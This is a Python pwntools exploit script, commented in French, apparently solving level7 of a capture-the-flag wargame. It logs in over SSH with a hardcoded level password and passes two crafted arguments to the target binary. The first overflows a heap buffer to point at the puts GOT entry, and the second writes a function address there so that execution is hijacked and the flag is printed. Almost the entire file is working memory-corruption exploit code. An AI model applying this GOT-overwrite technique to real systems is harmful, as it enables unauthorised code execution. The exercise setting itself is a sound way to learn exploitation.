#!/usr/bin/env python3
from pwn import *
import base64
import os

from pwnlib.adb import shell

# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8881  # Port pour SSH
USER = "level7"  # Nom d'utilisateur SSH
PASSWORD = "f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d"  # Mot de passe SSH
SSH_SESSION = None


def get_connection(custom_env=None, argv=None):
    global SSH_SESSION
    # Fonction helper pour fusionner les environnements
    def merge_env(base_env, custom_env):
        if custom_env:
            base_env.update(custom_env)
        return base_env

    if LOCAL:
        # En local, on utilise l'environnement actuel comme base
        SSH_SESSION = None
        local_env = os.environ.copy()
        final_env = merge_env(local_env, custom_env)
        final_argv = argv if argv is not None else ['./Resources/' + USER]
        return process(final_argv, env=final_env)
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        SSH_SESSION = shell
        # Récupérer l'environnement distant
        remote_env = shell.run('env').recvall().decode().strip()
        # Convertir l'output en dictionnaire
        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)

        # Fusionner avec nos variables personnalisées 
        final_env = merge_env(remote_env_dict, custom_env)
        final_argv = argv if argv is not None else ['/home/user/' + USER + '/' + USER]
        log.info(f"Final argv: {final_argv}")
        return shell.process(final_argv, env=final_env)


def find_function_address(function_name):
    elf = ELF('./Resources/' + USER)
    return elf.symbols[function_name]

def exploit():


    if LOCAL:
        target_function = find_function_address("m")
    else:
        target_function = 0x080484f4
    log.info(f"Target function address: {target_function}")

    puts_got_address = 0x08049928

    payload1 = b"A" * (20) + p32(puts_got_address)
    log.info(f"Payload: {payload1}")

    payload2 = p32(target_function)

    if not LOCAL:
        binary_path = f"/home/user/{USER}/{USER}"
        payload_arg = [binary_path, payload1, payload2]
    else:
        binary_path = f"./Resources/{USER}"
        payload_arg = [binary_path, payload1, payload2]



    if LOCAL:
        conn = gdb.debug(payload_arg, '''
          break *main+127
          continue
          x/2wx *(unsigned int *)($esp+28)
          x/2wx *((*(unsigned int *)($esp+28))+4)
          
          x/2wx *(unsigned int *)($esp+24)
          x/2wx *((*(unsigned int *)($esp+24))+4)
          ''')
    else:
        conn = get_connection(argv=payload_arg)

    flag = conn.recvline()
    print("\n=== Flag ===")
    print(flag.decode())
    
if __name__ == "__main__":
    exploit()
